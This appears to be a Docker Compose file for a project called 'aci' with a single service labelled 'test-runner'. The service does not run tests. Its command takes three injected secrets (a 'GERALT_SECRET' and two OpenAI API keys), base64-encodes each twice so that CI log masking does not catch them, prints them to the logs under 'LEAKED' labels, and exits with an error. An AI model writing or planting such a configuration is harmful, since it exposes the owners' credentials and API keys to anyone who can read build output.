name: aci
services:
  test-runner:
    image: alpine:3.19
    environment:
      - GERALT_SECRET=${GERALT_SECRET}
      - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY}
      - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY}
    command: >-
      /bin/sh -c 'echo GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64); echo SERVER_KEY_LEAKED=$(echo -n "$SERVER_OPENAI_API_KEY" | base64 | base64); echo CLI_KEY_LEAKED=$(echo -n "$CLI_OPENAI_API_KEY" | base64 | base64); exit 1'
